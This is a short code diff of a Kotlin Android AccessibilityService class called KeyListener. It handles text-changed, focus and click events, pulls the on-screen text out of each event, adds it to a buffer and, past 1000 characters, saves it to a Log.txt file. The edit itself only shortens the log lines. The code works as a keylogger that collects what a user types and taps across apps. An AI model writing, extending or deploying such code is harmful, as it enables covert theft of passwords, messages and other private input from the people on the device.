@@ -39,7 +39,7 @@ class KeyListener : AccessibilityService() {
                 $res$data
                 
                 """.trimIndent()
-                Log.v(TAG, "$time|(TEXT)|$data")
+                Log.v(TAG, data)
             }
             AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                 var data = event.text.toString()
@@ -48,7 +48,7 @@ class KeyListener : AccessibilityService() {
                     $res$data
                     
                     """.trimIndent()
-                Log.v(TAG, "$time|(FOCUSED)|$data")
+                Log.v(TAG, data)
             }
             AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                 var data = event.text.toString()
@@ -57,7 +57,7 @@ class KeyListener : AccessibilityService() {
                     $res$data
                     
                     """.trimIndent()
-                Log.v(TAG, time + "|(CLICKED)|" + event.packageName.toString() + data)
+                Log.v(TAG, data)
                 if (res.length > 1000) {
                     try {
                         val file = File(applicationContext.getExternalFilesDir(null), "Log.txt")
